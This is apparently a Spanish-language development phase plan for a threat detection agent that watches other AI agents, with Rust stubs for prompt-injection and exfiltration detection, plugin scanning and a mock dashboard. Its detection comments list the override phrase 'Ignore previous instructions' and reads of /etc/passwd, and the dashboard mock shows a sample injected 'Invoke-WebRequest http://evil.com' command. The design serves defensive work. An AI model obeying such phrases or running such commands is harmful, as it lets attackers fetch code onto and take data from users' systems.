# FASE R156 — THREAT DETECTION AGENT: Un agente que vigila a tu agente

**Objetivo:** Un agente de seguridad especializado que monitorea TODAS las acciones de los demás agentes y del sistema. Detecta: prompt injection, data exfiltration attempts, privilege escalation, unusual patterns, y supply chain attacks en plugins.

---

## Tareas

### 1. Security monitoring agent

```rust
pub struct ThreatDetectionAgent {
    rules: Vec<DetectionRule>,
    ml_model: Option<AnomalyDetector>,  // ONNX model para detección de anomalías
}

pub enum ThreatType {
    PromptInjection,       // LLM response intenta ejecutar comandos no solicitados
    DataExfiltration,      // Datos sensibles intentan salir por canal no autorizado
    PrivilegeEscalation,   // Agente intenta acceder a recursos fuera de su scope
    UnusualPattern,        // Comportamiento diferente al baseline
    SupplyChainAttack,     // Plugin malicioso o actualización comprometida
    BruteForce,            // Múltiples intentos de autenticación fallidos
    InsiderThreat,         // Usuario legítimo con comportamiento sospechoso
}
```

### 2. Prompt injection detection

```rust
pub fn detect_prompt_injection(llm_response: &str) -> Option<ThreatAlert> {
    // Detectar si la respuesta del LLM contiene:
    // - Instrucciones de ejecutar comandos no solicitados
    // - "Ignore previous instructions"
    // - URLs desconocidas para descargar/ejecutar
    // - Intento de leer archivos sensibles (/etc/passwd, registry, vault)
    // - Base64 encoded payloads
    // - Powershell/bash commands que no fueron solicitados por el usuario
    
    // Doble verificación: el ThreatAgent re-analiza la respuesta del LLM
    // ANTES de que se ejecute cualquier acción
}
```

### 3. Data exfiltration monitoring

```rust
pub fn monitor_outbound_data(request: &OutboundRequest) -> Option<ThreatAlert> {
    // Verificar que datos salientes:
    // - No contienen PII (usar PII detector de R152)
    // - Van a dominios permitidos (allowlist)
    // - El volumen es razonable (no 100MB de datos a un endpoint desconocido)
    // - No contienen vault secrets
    // - No contienen audit log entries
}
```

### 4. Plugin security scanner

```rust
pub fn scan_plugin(plugin_path: &Path) -> SecurityReport {
    // Antes de cargar un plugin:
    // 1. Verificar firma digital
    // 2. Scan WASM bytecode por patterns peligrosos
    // 3. Verificar que no accede a APIs fuera de su manifest
    // 4. Check dependencies contra vulnerability database
    // 5. Sandboxed test run con mock data
}
```

### 5. Frontend: Threat dashboard

```
THREAT MONITORING                        [Settings]
──────────────────────────────────────────────────
STATUS: 🟢 ALL CLEAR — No active threats

LAST 24 HOURS
  Scanned: 1,247 agent actions
  LLM responses checked: 456
  Outbound requests verified: 234
  Plugins scanned: 5
  
  ⚠️ 1 warning: Prompt injection attempt blocked
     LLM response contained: "Also, run: Invoke-WebRequest http://evil.com"
     Action: BLOCKED — command not executed
     Details: [View full analysis]

THREAT LOG
│ 14:30 ⚠️ Prompt injection blocked (LLM response)
│ 09:15 ✅ Plugin "weather-widget" scan passed
│ 08:00 ✅ Daily security scan complete — no issues
```

---

## Demo

1. Simular prompt injection en LLM response → ThreatAgent blocks → "Attempted injection blocked"
2. Plugin intenta enviar datos a URL no autorizada → BLOCKED → alert
3. Unusual pattern: 100 vault access attempts in 1 minute → ALERT → account locked
4. Threat dashboard: 1,247 actions scanned, 1 warning, 0 breaches
